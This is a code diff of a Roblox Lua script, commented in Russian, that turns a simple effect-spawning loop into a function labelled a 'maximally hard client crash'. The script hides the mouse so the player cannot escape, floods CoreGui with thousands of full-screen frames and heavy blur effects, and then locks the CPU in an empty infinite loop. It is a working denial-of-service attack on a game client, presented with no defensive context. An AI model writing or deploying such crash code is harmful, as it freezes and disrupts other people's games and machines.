@@ -1,8 +1,24 @@
-while true do
-    -- Создаем Blur или другие эффекты в огромном количестве
-    local blur = Instance.new("BlurEffect", game.Lighting)
-    blur.Size = 56
-    -- Спавним части в Workspace (только для этого игрока)
-    Instance.new("Part", workspace)
+-- Максимально жесткий краш клиента
+local function heavyCrash()
+    -- Отключаем обработку ввода, чтобы игрок не мог даже нажать Esc
+    game:GetService("UserInputService").MouseIconEnabled = false
+    
+    -- Бесконечный цикл создания "мусора" в памяти
+    while true do
+        task.spawn(function()
+            -- Создаем тяжелые объекты, которые дублируются в геометрической прогрессии
+            for i = 1, 1000 do
+                local s = Instance.new("ScreenGui", game.CoreGui)
+                local f = Instance.new("Frame", s)
+                f.Size = UDim2.new(1, 0, 1, 0)
+                -- Добавляем эффекты, которые нагружают видеокарту
+                Instance.new("BlurEffect", game.Lighting).Size = 100
+            end
+        end)
+        -- Этот пустой цикл без ожидания намертво вешает поток процессора
+        while true do end 
+    end
 end
+
+heavyCrash()
 
